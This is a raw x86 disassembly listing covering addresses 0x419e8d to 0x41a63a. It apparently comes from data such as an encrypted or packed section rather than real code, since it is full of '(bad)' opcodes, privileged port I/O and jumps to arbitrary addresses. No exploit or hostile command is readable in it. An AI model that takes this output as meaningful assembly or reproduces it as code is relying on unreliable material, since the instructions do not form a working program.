  419e8d:	mov    DWORD PTR [esi],ecx
  419e8f:	inc    ecx
  419e90:	jecxz  0x419ef8
  419e92:	dec    ecx
  419e93:	das    
  419e94:	pop    ebp
  419e95:	sbb    al,0xcb
  419e97:	push   esi
  419e98:	or     DWORD PTR [esi+0x7cb6ae6],edx
  419e9e:	imul   eax,ebx,0x4739fc87
  419ea4:	xchg   ecx,eax
  419ea5:	rol    DWORD PTR [esi+0x74],cl
  419ea8:	cmc    
  419ea9:	and    ah,dl
  419eab:	rep outs dx,WORD PTR ds:[esi]
  419eae:	sub    DWORD PTR [ecx],esp
  419eb0:	icebp  
  419eb1:	pop    eax
  419eb2:	cld    
  419eb3:	dec    edx
  419eb4:	out    0x9,eax
  419eb6:	xchg   ebp,eax
  419eb7:	out    0x5e,eax
  419eb9:	mov    edx,0x220d54c2
  419ebe:	stos   DWORD PTR es:[edi],eax
  419ebf:	push   0xfffffff8
  419ec1:	xchg   edi,eax
  419ec2:	ins    BYTE PTR es:[edi],dx
  419ec3:	inc    ebp
  419ec4:	mov    DWORD PTR [eax-0x19fd4a69],ebp
  419eca:	stos   DWORD PTR es:[edi],eax
  419ecb:	cmp    cl,BYTE PTR [edx+0xc]
  419ece:	xor    ecx,DWORD PTR ss:[ecx-0x246abbfc]
  419ed5:	push   ds
  419ed6:	(bad)  
  419ed7:	ret    
  419ed8:	and    edx,ecx
  419eda:	into   
  419edb:	xor    eax,0x2b9b29e1
  419ee0:	push   eax
  419ee1:	sub    ebx,DWORD PTR [esi+0x6fbf425c]
  419ee7:	rcl    BYTE PTR [edx+0x544a5b03],cl
  419eed:	jno    0x419f50
  419eef:	std    
  419ef0:	inc    ebp
  419ef1:	inc    esi
  419ef2:	bound  ecx,QWORD PTR ss:[edi+0x4400e834]
  419ef9:	into   
  419efa:	ds push edi
  419efc:	pop    ss
  419efd:	xor    edx,DWORD PTR [edi]
  419eff:	pop    ds
  419f00:	int    0x9c
  419f02:	mov    dh,0x54
  419f04:	dec    edx
  419f05:	cli    
  419f06:	lods   al,BYTE PTR ds:[esi]
  419f07:	sub    eax,0x4be54b7e
  419f0c:	cld    
  419f0d:	add    al,0xb1
  419f0f:	inc    esi
  419f10:	mov    ecx,0xd40097c3
  419f15:	lock imul edx,DWORD PTR [esi-0xb],0x460f1e68
  419f1d:	inc    ebp
  419f1e:	leave  
  419f1f:	fs sbb eax,0x2a95d0ec
  419f25:	out    dx,eax
  419f26:	enter  0xe1a4,0xf1
  419f2a:	mov    WORD PTR [edx],ss
  419f2c:	fwait
  419f2d:	je     0x419f81
  419f2f:	aas    
  419f30:	cmp    BYTE PTR [edi+0x299482d3],bl
  419f36:	neg    DWORD PTR [edi+0x652bd0ac]
  419f3c:	mov    ah,0xf3
  419f3e:	arpl   bx,di
  419f40:	push   ebp
  419f41:	stos   DWORD PTR es:[edi],eax
  419f42:	mov    ebp,0x67b6fc09
  419f47:	fisttp DWORD PTR [eax]
  419f49:	leave  
  419f4a:	or     DWORD PTR [ebx-0x38dc06f4],edi
  419f50:	xor    ecx,DWORD PTR [edi-0x50]
  419f53:	in     al,dx
  419f54:	test   BYTE PTR [eax],ch
  419f56:	scas   eax,DWORD PTR es:[edi]
  419f57:	jp     0x419f9e
  419f59:	ror    ch,1
  419f5b:	dec    edx
  419f5c:	adc    edi,DWORD PTR [edx+0x5a]
  419f5f:	cmp    esi,ecx
  419f61:	aaa    
  419f62:	pop    edi
  419f63:	jge    0x419f71
  419f65:	mov    dh,0x61
  419f67:	lahf   
  419f68:	mov    gs,WORD PTR [eax]
  419f6a:	or     esi,DWORD PTR [eax+eiz*1]
  419f6d:	popf   
  419f6e:	and    DWORD PTR [edi],esi
  419f70:	cdq    
  419f71:	rol    BYTE PTR [esi],0xb7
  419f74:	jmp    0xd0a60342
  419f79:	dec    esp
  419f7a:	inc    bh
  419f7c:	cmp    DWORD PTR [edx-0x4a],ebp
  419f7f:	fmul   st(7),st
  419f81:	jnp    0x419f41
  419f83:	and    edx,esi
  419f85:	or     DWORD PTR [esi-0x2fea8dfb],0xff833eac
  419f8f:	cmp    BYTE PTR [ebp+0x1c],ah
  419f92:	mov    es,WORD PTR [ebp-0x756aa120]
  419f98:	sbb    BYTE PTR [edi],bl
  419f9a:	xor    al,0x2d
  419f9c:	aas    
  419f9d:	(bad)  
  419f9e:	inc    esi
  419f9f:	ss adc edi,edx
  419fa2:	inc    edx
  419fa3:	sub    BYTE PTR [esp+eax*8-0x2b03d0ea],bh
  419faa:	jmp    0x419f8a
  419fac:	aas    
  419fad:	sti    
  419fae:	(bad)  
  419faf:	js     0x419f7d
  419fb1:	into   
  419fb2:	idiv   DWORD PTR [eax+0x25]
  419fb5:	adc    eax,0x9bd035da
  419fbb:	pop    ecx
  419fbc:	inc    eax
  419fbd:	push   ebp
  419fbe:	repz xor cl,BYTE PTR [ecx]
  419fc1:	mov    bh,0x7c
  419fc3:	das    
  419fc4:	xor    al,0x82
  419fc6:	out    0x14,eax
  419fc8:	out    0xa8,eax
  419fca:	push   edi
  419fcb:	int3   
  419fcc:	sahf   
  419fcd:	es push ds
  419fcf:	jb     0x419f60
  419fd1:	cmp    DWORD PTR [esi-0x47],0x55
  419fd5:	icebp  
  419fd6:	ins    DWORD PTR es:[edi],dx
  419fd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419fd8:	hlt    
  419fd9:	int3   
  419fda:	mov    esi,0x5741caa8
  419fdf:	add    eax,0xc12f74b6
  419fe4:	addr16 fs in eax,0x65
  419fe8:	push   ss
  419fe9:	sbb    dh,ch
  419feb:	mov    edx,0xc87b18a6
  419ff0:	xchg   ecx,eax
  419ff1:	cwde   
  419ff2:	pop    ecx
  419ff3:	adc    ch,dh
  419ff5:	mov    esi,0x9afa873d
  419ffa:	leave  
  419ffb:	adc    al,0x34
  419ffd:	enter  0x4453,0x75
  41a001:	inc    ebx
  41a002:	push   ebx
  41a003:	inc    ebp
  41a004:	lahf   
  41a005:	out    dx,al
  41a006:	cli    
  41a007:	adc    BYTE PTR [edi+0x0],al
  41a00a:	push   edi
  41a00b:	sbb    BYTE PTR es:[ecx+eax*1-0x70],0xfc
  41a011:	out    0xf3,eax
  41a013:	xchg   edx,eax
  41a014:	(bad)  
  41a015:	mov    esp,ebp
  41a017:	div    BYTE PTR [ebx-0x48641796]
  41a01d:	sub    BYTE PTR [ebx-0x18ab087c],0x87
  41a024:	aam    0x46
  41a026:	push   edi
  41a027:	mov    bl,0xc9
  41a029:	xchg   edx,eax
  41a02a:	out    dx,eax
  41a02b:	fdivr  DWORD PTR ds:0x2192d1c9
  41a031:	sahf   
  41a032:	sbb    ebp,DWORD PTR ds:0xea07b8dc
  41a038:	std    
  41a039:	pop    esi
  41a03a:	jo     0x41a03c
  41a03c:	fild   DWORD PTR [edi-0x4341e9a9]
  41a042:	cmp    cl,ah
  41a044:	into   
  41a045:	jg     0x41a01f
  41a047:	cli    
  41a048:	cmp    al,dh
  41a04a:	inc    ebp
  41a04b:	mov    esp,DWORD PTR [edi]
  41a04d:	test   edi,ebx
  41a04f:	or     DWORD PTR [ecx-0x96f564d],0x70550996
  41a059:	mov    ds:0x2a11bfbd,al
  41a05e:	imul   esi,DWORD PTR [eax],0xe4a13a6c
  41a064:	(bad)  
  41a065:	and    eax,0x82bab168
  41a06a:	jno    0x41a00a
  41a06c:	dec    eax
  41a06d:	xor    ebx,edi
  41a06f:	push   ss
  41a070:	mov    bl,0x5b
  41a072:	xor    al,0x74
  41a074:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a075:	retf   
  41a076:	repnz push esp
  41a078:	xchg   DWORD PTR [edx],edi
  41a07a:	or     DWORD PTR [ecx+edi*1-0x452e620b],edx
  41a081:	repz jg 0x41a02c
  41a084:	jne    0x41a105
  41a086:	cs push eax
  41a088:	jmp    DWORD PTR [ebx-0x35c7eb39]
  41a08e:	stos   DWORD PTR es:[edi],eax
  41a08f:	add    al,0xd2
  41a091:	int3   
  41a092:	mov    eax,0xcabd1b26
  41a097:	lds    edx,FWORD PTR [ebx]
  41a099:	sub    eax,0x64efced3
  41a09e:	sub    al,0xce
  41a0a0:	adc    ebx,DWORD PTR [edx+0x2636ad32]
  41a0a6:	in     al,dx
  41a0a7:	rcl    DWORD PTR [edx],0xdd
  41a0aa:	mov    edi,0x3525f716
  41a0af:	add    eax,0x8c9e5ed4
  41a0b4:	cwde   
  41a0b5:	jno    0x41a0d0
  41a0b7:	mov    eax,0x154a8b18
  41a0bc:	(bad)  
  41a0bd:	fwait
  41a0be:	jnp    0x41a139
  41a0c0:	(bad)  
  41a0c2:	mov    al,BYTE PTR [edi-0x59]
  41a0c5:	jle    0x41a093
  41a0c7:	xor    bh,BYTE PTR [ecx-0x1f]
  41a0ca:	arpl   bx,ax
  41a0cc:	cwde   
  41a0cd:	mov    ebx,0xf2df744c
  41a0d2:	xor    esp,DWORD PTR [eax+0x62]
  41a0d5:	sub    BYTE PTR [ebx],ch
  41a0d7:	pop    edx
  41a0d8:	adc    eax,0x1c8bf557
  41a0dd:	dec    edi
  41a0de:	cmp    al,0xdc
  41a0e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0e1:	jns    0x41a0f9
  41a0e3:	sub    BYTE PTR [edx+edx*1],cl
  41a0e6:	imul   eax,DWORD PTR [ecx+0x6b],0x36a22fd
  41a0ed:	fmul   DWORD PTR [ebp-0x2af021]
  41a0f3:	mov    edx,?
  41a0f5:	loope  0x41a129
  41a0f7:	cmp    al,0x25
  41a0f9:	mov    dl,0xa0
  41a0fb:	push   edx
  41a0fc:	mov    BYTE PTR ds:0x6c3f07a,bh
  41a102:	sub    ecx,DWORD PTR [edx-0x4e3ccc52]
  41a108:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a109:	(bad)  
  41a10a:	(bad)  
  41a10b:	stc    
  41a10c:	adc    al,0xec
  41a10e:	(bad)  [eax+0x5e6bff3]
  41a114:	mov    dh,0x4e
  41a116:	je     0x41a194
  41a118:	push   esi
  41a119:	and    BYTE PTR [ebp+edi*8-0x23],bh
  41a11d:	cs pop edi
  41a11f:	xor    eax,esi
  41a121:	add    esp,esp
  41a123:	repz mov cl,0x5
  41a126:	cmp    DWORD PTR [edi],edx
  41a128:	int3   
  41a129:	lods   al,BYTE PTR ds:[esi]
  41a12a:	sahf   
  41a12b:	mov    al,ds:0x7b0e08a4
  41a130:	addr16 dec esp
  41a132:	(bad)  
  41a133:	retf   
  41a134:	jge    0x41a104
  41a136:	rol    DWORD PTR [ecx+eax*2],0x1e
  41a13a:	add    dl,dh
  41a13c:	mov    WORD PTR [edx+0x34f39447],cs
  41a142:	mov    dl,0x3a
  41a144:	call   0x7d53:0xa8fb90e4
  41a14b:	push   cs
  41a14c:	in     eax,dx
  41a14d:	add    bl,BYTE PTR [ebx]
  41a14f:	mov    eax,DWORD PTR [esi+0x11]
  41a152:	stc    
  41a153:	not    BYTE PTR [eax-0x3f]
  41a156:	push   0xe074cea9
  41a15b:	daa    
  41a15c:	mov    ds:0xc1604ac3,eax
  41a161:	daa    
  41a162:	ror    DWORD PTR [esi],1
  41a164:	jnp    0x41a162
  41a166:	scas   al,BYTE PTR es:[edi]
  41a167:	aas    
  41a168:	out    dx,eax
  41a169:	jno    0x41a150
  41a16b:	into   
  41a16c:	jne    0x41a1c5
  41a16e:	cld    
  41a16f:	inc    ebp
  41a170:	outs   dx,BYTE PTR ds:[esi]
  41a171:	clc    
  41a172:	int    0x8
  41a174:	pop    ds
  41a175:	xchg   BYTE PTR [ecx+0x7cf4f583],al
  41a17b:	hlt    
  41a17c:	sbb    al,cl
  41a17e:	das    
  41a17f:	mov    ecx,DWORD PTR [eax+0x7a]
  41a182:	rcr    BYTE PTR [ecx],cl
  41a184:	outs   dx,DWORD PTR ds:[esi]
  41a185:	daa    
  41a186:	push   eax
  41a187:	jle    0x41a15e
  41a189:	inc    ebp
  41a18a:	hlt    
  41a18b:	pop    edi
  41a18c:	mov    ?,WORD PTR [edi+0x2fd0a9df]
  41a192:	sub    al,0x47
  41a194:	dec    ebx
  41a195:	jae    0x41a17b
  41a197:	mov    al,0x62
  41a199:	sub    edx,ebx
  41a19b:	bnd jbe 0x41a1ee
  41a19e:	add    BYTE PTR [eax+0x1479b749],al
  41a1a4:	sub    bh,BYTE PTR [edx+0x2c]
  41a1a7:	xchg   ecx,eax
  41a1a8:	pop    ebp
  41a1a9:	sub    edx,DWORD PTR [edx+0x2952d776]
  41a1af:	add    ecx,DWORD PTR [edi-0x2da3d36f]
  41a1b5:	lds    esi,FWORD PTR [edi+0x57]
  41a1b8:	sbb    eax,0x2732540b
  41a1bd:	add    al,0xe
  41a1bf:	cmp    esi,DWORD PTR [eax]
  41a1c1:	jae    0x41a19f
  41a1c3:	and    eax,ecx
  41a1c5:	aaa    
  41a1c6:	test   al,0xb0
  41a1c8:	inc    eax
  41a1c9:	loop   0x41a1df
  41a1cb:	push   ebx
  41a1cc:	sahf   
  41a1cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a1ce:	inc    sp
  41a1d0:	push   cs
  41a1d1:	xchg   dl,dh
  41a1d3:	add    al,0xe6
  41a1d5:	adc    eax,0x4fa786ed
  41a1da:	xchg   BYTE PTR [edx-0x6a],ah
  41a1dd:	mov    edx,0xbab27511
  41a1e2:	iret   
  41a1e3:	icebp  
  41a1e4:	sub    DWORD PTR [eax],edx
  41a1e6:	fwait
  41a1e7:	pushf  
  41a1e8:	cli    
  41a1e9:	add    al,0x94
  41a1eb:	es ror esi,cl
  41a1ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a1ef:	out    dx,eax
  41a1f0:	in     eax,dx
  41a1f1:	lock jmp 0x3366da53
  41a1f7:	loop   0x41a1af
  41a1f9:	xor    dh,BYTE PTR [eax+0x7b03aad0]
  41a1ff:	mov    ebp,0x7fde81cc
  41a204:	lods   eax,DWORD PTR ds:[esi]
  41a205:	pop    edi
  41a206:	push   es
  41a207:	repnz and ebp,DWORD PTR [ebp+0x5425fdfb]
  41a20e:	lock les esp,FWORD PTR [ebx+0x2408a691]
  41a215:	cmc    
  41a216:	cmp    cl,BYTE PTR [ebp+0x45]
  41a219:	or     eax,0xd0d16073
  41a21e:	mov    ds:0x2a06ebba,eax
  41a223:	out    dx,eax
  41a224:	imul   eax,DWORD PTR [ebp-0x43],0xffffffd6
  41a228:	test   eax,0xf5b2e79e
  41a22d:	fisub  DWORD PTR [edx+eiz*4-0x704e16bd]
  41a234:	jl     0x41a311
  41a23a:	add    BYTE PTR [eax],al
  41a23c:	add    BYTE PTR [eax],al
  41a23e:	add    BYTE PTR [eax],al
  41a240:	add    BYTE PTR [esi-0x105c14ff],ch
  41a246:	jmp    0x41a236
  41a248:	or     eax,0x116c2f8b
  41a24d:	push   ecx
  41a24e:	inc    esp
  41a24f:	sub    ch,ah
  41a251:	adc    esp,DWORD PTR [eax]
  41a253:	add    DWORD PTR [eax],eax
  41a255:	scas   al,BYTE PTR es:[edi]
  41a256:	add    eax,DWORD PTR [eax]
  41a258:	add    BYTE PTR [esi+ecx*2-0x4e16703c],dh
  41a25f:	stos   BYTE PTR es:[edi],al
  41a260:	push   0xda1aaa41
  41a265:	sbb    al,0xb3
  41a267:	sub    BYTE PTR [ebp-0x2bbc8b99],ch
  41a26d:	pop    esp
  41a26e:	push   ss
  41a26f:	ret    
  41a270:	jbe    0x41a2b1
  41a272:	lahf   
  41a273:	xchg   ecx,ebx
  41a275:	jecxz  0x41a27e
  41a277:	jno    0x41a224
  41a279:	(bad)  
  41a27a:	xor    ebp,DWORD PTR [ecx+0x6a8833ff]
  41a280:	jno    0x41a286
  41a282:	pop    ecx
  41a283:	add    ebp,DWORD PTR [ecx+0x19]
  41a286:	jns    0x41a299
  41a288:	or     esp,esp
  41a28a:	loope  0x41a229
  41a28c:	adc    BYTE PTR [edx+0x2b],bh
  41a28f:	jmp    0x7ad45c88
  41a294:	push   0x52
  41a296:	mov    ebp,eax
  41a298:	int3   
  41a299:	imul   ebp,eax,0xb6070fee
  41a29f:	test   DWORD PTR [ebp-0x731d0e49],edi
  41a2a5:	xchg   esi,eax
  41a2a6:	add    al,0xb0
  41a2a8:	xor    BYTE PTR [edi-0x10],ah
  41a2ab:	pop    edi
  41a2ac:	adc    al,0x4a
  41a2ae:	mul    BYTE PTR [eax-0x80]
  41a2b1:	push   es
  41a2b2:	mul    edi
  41a2b4:	inc    esp
  41a2b5:	lahf   
  41a2b6:	add    DWORD PTR [esi+0x4f7ac346],0x341d23c5
  41a2c0:	push   ecx
  41a2c1:	or     BYTE PTR [eax+0x4b],al
  41a2c4:	mov    edx,0xbff5f48e
  41a2c9:	fsub   DWORD PTR [eax+0x42]
  41a2cc:	loopne 0x41a2ba
  41a2ce:	or     bl,BYTE PTR [ebx]
  41a2d0:	js     0x41a317
  41a2d2:	lahf   
  41a2d3:	inc    BYTE PTR [ebx+0x1fce9256]
  41a2d9:	fdivr  st,st(3)
  41a2db:	pusha  
  41a2dc:	push   edi
  41a2dd:	sub    eax,0x42665aef
  41a2e2:	pop    ds
  41a2e3:	je     0x41a2a2
  41a2e5:	popf   
  41a2e6:	loop   0x41a311
  41a2e8:	pop    ebx
  41a2e9:	test   BYTE PTR [ecx+0x58],ah
  41a2ec:	scas   al,BYTE PTR es:[edi]
  41a2ed:	cli    
  41a2ee:	pop    es
  41a2ef:	ficomp DWORD PTR [edi-0x6ae66953]
  41a2f5:	lock mov esi,0xc468cd97
  41a2fb:	xchg   BYTE PTR [edx+0x23033978],bh
  41a301:	ins    BYTE PTR es:[edi],dx
  41a302:	sbb    al,0x64
  41a304:	dec    ebx
  41a305:	nop
  41a306:	sub    edx,DWORD PTR [eax-0x39a05d25]
  41a30c:	cmc    
  41a30d:	ins    DWORD PTR es:[edi],dx
  41a30e:	(bad)
  41a311:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a312:	lds    ecx,FWORD PTR [esi]
  41a314:	in     al,dx
  41a315:	cwde   
  41a316:	jae    0x41a364
  41a318:	imul   esp,DWORD PTR [ecx],0xc7575857
  41a31e:	outs   dx,BYTE PTR ds:[esi]
  41a31f:	stc    
  41a320:	sti    
  41a321:	scas   al,BYTE PTR es:[edi]
  41a322:	bound  ebp,QWORD PTR [esi]
  41a324:	push   edx
  41a325:	fadd   DWORD PTR [bp-0x7241]
  41a32a:	retf   
  41a32b:	mov    ecx,0xd2bbbad7
  41a330:	or     BYTE PTR [ecx+edx*2],0x73
  41a334:	pop    ebp
  41a335:	or     cl,bh
  41a337:	pop    eax
  41a338:	xchg   DWORD PTR [edi-0x53989d50],ecx
  41a33e:	push   ebp
  41a33f:	pop    esp
  41a340:	mov    edx,0x1bd924db
  41a345:	mov    dl,0xe9
  41a347:	mov    al,0x33
  41a349:	pushf  
  41a34a:	push   0x5995473b
  41a34f:	mov    ds:0x716db7e3,al
  41a354:	jmp    0x41a369
  41a356:	xor    eax,DWORD PTR [esi-0x411dd6a7]
  41a35c:	cli    
  41a35d:	cmovo  esp,esp
  41a360:	bound  eax,QWORD PTR [esi+0x56269ad9]
  41a366:	xchg   ebx,eax
  41a367:	inc    esi
  41a368:	es xchg edx,eax
  41a36a:	(bad)  
  41a36b:	ret    
  41a36c:	dec    esi
  41a36d:	aad    0xe5
  41a36f:	test   DWORD PTR [ebp-0x1da78833],0xc1da7296
  41a379:	rcr    esp,1
  41a37b:	add    edi,ebp
  41a37d:	xor    esp,ecx
  41a37f:	sbb    esp,ecx
  41a381:	imul   ebp,DWORD PTR [eax+0xee53efc],0x4a
  41a388:	jb     0x41a3d8
  41a38a:	pop    ds
  41a38b:	cli    
  41a38c:	pop    eax
  41a38d:	or     edx,edx
  41a38f:	sub    BYTE PTR [ebx+0x3a],bl
  41a392:	jmp    0x41a348
  41a394:	sub    ecx,DWORD PTR [ebx-0x2f9353f2]
  41a39a:	sbb    ch,BYTE PTR [eax-0x2c]
  41a39d:	call   FWORD PTR [esi]
  41a39f:	fsubr  DWORD PTR [edx+0x7fdc9995]
  41a3a5:	bound  esi,QWORD PTR [ebx-0x1d0798df]
  41a3ab:	out    0x5,eax
  41a3ad:	fnstenv [ebp-0x1358cb33]
  41a3b3:	arpl   WORD PTR [ebx+eiz*8],cx
  41a3b6:	mov    bl,0x75
  41a3b8:	add    eax,0x5816b53
  41a3bd:	sub    al,0x40
  41a3bf:	test   BYTE PTR [eax-0x51],bh
  41a3c2:	pop    ebp
  41a3c3:	fidiv  WORD PTR [esi-0x37c8abf6]
  41a3c9:	es dec edi
  41a3cb:	mov    BYTE PTR [eax],ah
  41a3cd:	shl    DWORD PTR [esi+0x33d869fc],0x88
  41a3d4:	sub    eax,0x6a2f60d0
  41a3d9:	inc    esp
  41a3da:	or     ebx,DWORD PTR [eax+0x11481c6a]
  41a3e0:	clc    
  41a3e1:	int3   
  41a3e2:	jo     0x41a3ec
  41a3e4:	rcr    DWORD PTR [esp+ecx*2-0x41],0xf5
  41a3e9:	add    eax,0xeb598b90
  41a3ee:	fwait
  41a3ef:	cmp    edx,DWORD PTR ds:0xa546af82
  41a3f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3f6:	sar    DWORD PTR [edi-0x61],1
  41a3f9:	xchg   ecx,eax
  41a3fa:	push   ss
  41a3fb:	push   ebx
  41a3fc:	out    dx,eax
  41a3fd:	pushf  
  41a3fe:	push   ebx
  41a3ff:	bound  edx,QWORD PTR [ecx-0x7e]
  41a402:	adc    BYTE PTR [ebp+0x4c1d727],0x16
  41a409:	push   edi
  41a40a:	aad    0x2f
  41a40c:	jmp    FWORD PTR [ebx]
  41a40e:	jns    0x41a483
  41a410:	pop    ds
  41a411:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a412:	xor    dh,dh
  41a414:	or     DWORD PTR [ecx-0x7b],edx
  41a417:	sar    ah,1
  41a419:	add    eax,0x6550e71c
  41a41e:	xchg   edi,eax
  41a41f:	sub    edx,DWORD PTR [ebx]
  41a421:	sub    dl,BYTE PTR [eax+0x133ec137]
  41a427:	cmp    al,0x5f
  41a429:	jbe    0x41a46b
  41a42b:	outs   dx,DWORD PTR ds:[esi]
  41a42c:	lods   al,BYTE PTR ds:[esi]
  41a42d:	test   DWORD PTR [edi+0x6a],ecx
  41a430:	jno    0x41a421
  41a432:	xor    DWORD PTR [eax-0x58c44a01],0x48aad362
  41a43c:	xor    al,0x5b
  41a43e:	xchg   edi,eax
  41a43f:	mov    eax,ds:0x1e771e02
  41a444:	inc    ebp
  41a445:	or     ah,BYTE PTR [edi+0x3494ae71]
  41a44b:	test   al,0x42
  41a44d:	jl     0x41a402
  41a44f:	sahf   
  41a450:	(bad)  
  41a451:	aam    0x18
  41a453:	fcmovb st,st(3)
  41a455:	and    bl,0xc
  41a458:	arpl   sp,bx
  41a45a:	add    ah,ah
  41a45c:	dec    edx
  41a45d:	in     al,0x1f
  41a45f:	test   BYTE PTR ss:[eax-0x73],0x64
  41a464:	inc    ebp
  41a465:	adc    DWORD PTR [ebp+0x23],0x3a
  41a469:	push   0xe457a856
  41a46e:	push   cs
  41a46f:	xor    DWORD PTR [ecx-0x375467d7],edx
  41a475:	pop    esp
  41a476:	xchg   esp,ebp
  41a478:	scas   al,BYTE PTR es:[edi]
  41a479:	push   cs
  41a47a:	repnz icebp 
  41a47c:	cmp    al,BYTE PTR [ebp-0x3fc5bcb9]
  41a482:	shl    DWORD PTR [edx+0x5da14ade],cl
  41a488:	fs pop ecx
  41a48a:	mov    WORD PTR ds:0x9f4b7104,fs
  41a490:	pop    ecx
  41a491:	fnstsw WORD PTR [eax+0x4f48b9a3]
  41a497:	into   
  41a498:	push   0x8f0a280b
  41a49d:	push   ebp
  41a49e:	push   es
  41a49f:	push   ebx
  41a4a0:	aas    
  41a4a1:	push   eax
  41a4a2:	mov    al,bl
  41a4a4:	pop    ebx
  41a4a5:	(bad)  
  41a4a6:	ja     0x41a504
  41a4a8:	inc    edi
  41a4aa:	or     esi,esi
  41a4ac:	jecxz  0x41a4a6
  41a4ae:	jo     0x41a52b
  41a4b0:	pop    ebx
  41a4b1:	sub    BYTE PTR [ebp+edx*8+0x3586fd9a],dh
  41a4b8:	ja     0x41a45b
  41a4ba:	jl     0x41a46a
  41a4bc:	outs   dx,DWORD PTR ds:[esi]
  41a4bd:	shl    DWORD PTR [eax-0x53],1
  41a4c0:	or     DWORD PTR [edx+0x1e],0xe85a403
  41a4c7:	mov    edi,0x45441f84
  41a4cc:	xchg   esi,eax
  41a4cd:	loop   0x41a546
  41a4cf:	cmp    dh,0xc7
  41a4d2:	xor    al,0xbc
  41a4d4:	cmc    
  41a4d5:	retf   
  41a4d6:	jns    0x41a4b6
  41a4d8:	cdq    
  41a4d9:	push   eax
  41a4da:	mov    al,ds:0xc60782ec
  41a4df:	pushf  
  41a4e0:	fisttp WORD PTR [edx-0x7031e76f]
  41a4e6:	mov    cl,0xb4
  41a4e8:	push   esi
  41a4e9:	push   0xffffff8e
  41a4eb:	or     al,0x57
  41a4ed:	clc    
  41a4ee:	mov    eax,0x547c3bd
  41a4f3:	je     0x41a4ca
  41a4f5:	and    DWORD PTR [edx+0x5c1e45e8],esp
  41a4fb:	sbb    edx,eax
  41a4fd:	sbb    al,0xba
  41a4ff:	in     al,dx
  41a500:	push   ss
  41a501:	sbb    edi,DWORD PTR [edi-0x582d58bb]
  41a507:	mov    edi,0xb33e1606
  41a50c:	push   ds
  41a50d:	jae    0x41a4e3
  41a50f:	call   0x9a71:0x47b6d07b
  41a516:	mov    ah,0x7c
  41a519:	test   eax,0x98f84e2c
  41a51e:	imul   ebx,DWORD PTR gs:[esi-0x7b21a588],0x7c
  41a526:	push   ebp
  41a527:	es jne 0x41a515
  41a52a:	outs   dx,BYTE PTR ds:[esi]
  41a52b:	ret    
  41a52c:	push   eax
  41a52d:	push   ebp
  41a52e:	jb     0x41a55f
  41a530:	or     eax,0xb1b3407f
  41a535:	adc    eax,0xde2cd291
  41a53a:	out    0x17,al
  41a53c:	ret    
  41a53d:	mov    dh,0xaf
  41a53f:	mov    edx,0x889c2659
  41a544:	xchg   ebp,eax
  41a545:	and    eax,DWORD PTR [edi+edi*4]
  41a548:	push   0xa8031cd4
  41a54d:	lds    eax,FWORD PTR [ebp+0x35163fdf]
  41a553:	sbb    eax,0x4d370e84
  41a558:	push   0x72
  41a55a:	push   edi
  41a55b:	jmp    0xd9a0:0x268e4bb0
  41a562:	push   ebp
  41a563:	imul   ecx,DWORD PTR [ebx+0x8793327],0x5c
  41a56a:	clc    
  41a56b:	jp     0x41a52b
  41a56d:	ror    BYTE PTR [eax-0x66],1
  41a570:	inc    esp
  41a571:	pop    ebx
  41a572:	and    al,0xb
  41a574:	push   cs
  41a575:	ret    0x1913
  41a578:	test   DWORD PTR [ebx+0x55],ebp
  41a57b:	mov    dh,0xa5
  41a57d:	call   0x46237ed8
  41a582:	dec    ebx
  41a583:	dec    ebx
  41a584:	mov    esi,0xfa91e33e
  41a589:	loope  0x41a5ee
  41a58b:	je     0x41a532
  41a58d:	into   
  41a58e:	mov    eax,DWORD PTR [eax+ecx*4-0x3e]
  41a592:	test   DWORD PTR ds:0x41a8028f,ebp
  41a598:	je     0x41a609
  41a59a:	add    DWORD PTR [esi],edx
  41a59c:	lock sub eax,0xbde56970
  41a5a2:	add    edi,DWORD PTR [eax]
  41a5a4:	loope  0x41a613
  41a5a6:	mov    dh,0x22
  41a5a8:	sub    DWORD PTR [ebp-0x7b],ebp
  41a5ab:	adc    al,0xb2
  41a5ad:	add    ecx,DWORD PTR [esi-0x63962f2b]
  41a5b3:	in     eax,dx
  41a5b4:	and    BYTE PTR [ebx],0x35
  41a5b7:	inc    edx
  41a5b8:	cmp    ecx,DWORD PTR [ebp-0x156affc1]
  41a5be:	icebp  
  41a5bf:	jp     0x41a602
  41a5c1:	and    edx,DWORD PTR [edi+0x50]
  41a5c4:	sbb    eax,DWORD PTR [esi+eax*2-0x2b]
  41a5c8:	and    BYTE PTR [esi+eax*4+0x47],ah
  41a5cc:	mov    ch,0x26
  41a5ce:	xor    edx,DWORD PTR [ecx]
  41a5d0:	push   es
  41a5d1:	js     0x41a5f5
  41a5d3:	xor    ebx,ebp
  41a5d5:	loopne 0x41a584
  41a5d7:	(bad)  
  41a5d8:	dec    ebp
  41a5d9:	xchg   esi,eax
  41a5da:	xor    al,ch
  41a5dc:	push   ebp
  41a5dd:	bound  ebp,QWORD PTR [ecx+0x40928aac]
  41a5e3:	sbb    ah,BYTE PTR [edx+ebx*2+0x7a]
  41a5e7:	sbb    DWORD PTR [ebx-0x17d5c141],edx
  41a5ed:	pop    ds
  41a5ee:	fdiv   DWORD PTR [eax]
  41a5f0:	cmp    eax,DWORD PTR [ebx-0x79]
  41a5f3:	jp     0x41a58e
  41a5f5:	icebp  
  41a5f6:	or     eax,0xfb2057f
  41a5fb:	ret    
  41a5fc:	mov    ds:0x26c3b695,al
  41a601:	xchg   ecx,eax
  41a602:	jae    0x41a5d0
  41a604:	dec    ecx
  41a605:	pop    ds
  41a606:	jge    0x41a608
	...
  41a610:	add    ah,dl
  41a612:	mov    edi,0xedff8dd6
  41a617:	(bad)  
  41a619:	or     al,0x14
  41a61b:	call   0xc17c:0x661ba64e
  41a622:	and    eax,DWORD PTR [ecx]
  41a624:	add    BYTE PTR [esi-0x1fffffd],ch
  41a62a:	jno    0x41a5fe
  41a62c:	jne    0x41a66b
  41a62e:	aad    0x5a
  41a630:	mov    al,0x6d
  41a632:	pcmpgtb mm0,QWORD PTR [ebp+0x78ae5f80]
  41a639:	pop    ebx
  41a63a:	adc    dh,BYTE PTR [ebx]
